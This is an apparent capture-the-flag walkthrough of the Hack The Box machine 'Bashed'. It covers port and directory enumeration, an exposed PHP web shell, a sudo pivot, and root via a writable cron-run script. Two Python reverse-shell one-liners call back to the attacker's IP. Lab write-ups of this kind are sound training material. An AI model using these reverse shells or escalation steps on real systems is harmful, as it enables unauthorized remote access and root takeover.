---
title: "Bashed"
difficulty: Easy
---

# Bashed

🔗 [Bashed](https://www.hackthebox.com/machines/bashed)

### Task 1 - Deploy the machine

🎯 Target IP: `<YOUR_IP>`

On the Desktop, set up a folder named after the machine, and within it add a nested folder to hold all the working files and results for this box, such as the nmap scans.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "<YOUR_IP> bashed.htb" >> /etc/hosts

mkdir -p htb/bashed.htb
cd htb/bashed.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

My usual first step is to ping the host, which both confirms it is reachable and hints at the underlying OS.

```bash
ping -c 3 bashed.htb
PING bashed.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=67.3 ms
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=64.2 ms
64 bytes from bashed.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=79.4 ms
```

From the three ICMP replies the TTL sits around \~64, which points to a \*nix host, whereas Windows boxes typically report a TTL near 128.

### 2.1 - How many open TCP ports are listening on Bashed??

```bash
nmap -p0- -sS -Pn -vvv bashed.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

Only a single TCP port turns up as open on the box: 80

1

### 2.2 - What is the relative path on the webserver to a folder that contains phpbash.php??

Next, we run a more focused scan with the -sCV flags to grab service versions and run the standard scripts.

```bash
nmap -p80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
```

#### Port 80

Opening port 80 in the browser shows a site that references a php-based bash shell.

The page source reveals nothing useful, so we gather more details about the site with whatweb and enumerate directories with gobuster.

```bash
whatweb bashed.htb
http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[<YOUR_IP>], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

```
gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
```

The scan surfaces some notable directories like /dev and /uploads, and browsing through them answers the question.

/dev

### 2.3 - What user is the webserver running as on Bashed?

Inside /dev there are two php web shells; phpbash.min.php is likely a stripped-down or beta build, while phpbash.php is the complete version.

Either way, both report the same running user right away.

www-data

### Task 3 - Find user flag

### 3.1 - Submit the flag located in the arrexel user's home directory.

Browsing the filesystem makes it easy to locate the user home directories and grab arrexel's flag.

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

b2e6************************40cb

</details>

### 3.2 - www-data can run any command as a user without a password. What is that user's username?

Running sudo -l shows that www-data is allowed to run every command on the box as the user scriptmanager.

scriptmanager

### 3.3 - What folder in the system root can scriptmanager access that www-data could not?

Moving to the root directory / and running ls -l lets us review the permissions on each folder.

/scripts

### 3.4 - What is filename of the file that is being run by root every couple minutes?

The phrase "every couple minutes" is a clue toward the likely path forward.

That said, we choose to drop into a reverse shell on our attacker box to make things easier. We start a listener with netcat `nc -lvnp 1339` and run a python one-liner from the web shell.

```python
export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Keeping in mind the question's hint and the previous task, where only scriptmanager can reach the /scripts folder, we switch to the scriptmanager user and spawn a bash shell.

```bash
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Attempting sudo -l prompts for a password we don't have.

We now have access to the /scripts directory, which holds two files:

On top of that, judging by the last-access time on `test.txt`, the `test.py` program seems to run roughly once a minute. This suggests a root-owned cron job that runs `test.py` every minute. We can verify it by renaming `test.txt` (for example to `test.txt.old`) and watching a fresh `test.txt` reappear about a minute later."

This matters because editing `test.py` to add reverse shell code would cause that code to run as root.

After that, we'll create a new `test.py` on the Kali box containing the same reverse shell payload from before, then push it over to the target 'Bashed' machine.

```python
echo "import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.10.14.6',4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(['/bin/sh','-i']);" > test.py
```

test.py

### Task 4 - Find root flag

### 4.1 - Submit the flag located in root's home directory.

Within roughly two minutes, our netcat listener on the attacker machine catches the connection and hands us a shell running as root.

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

40ca************************bcfe

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/bashed.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
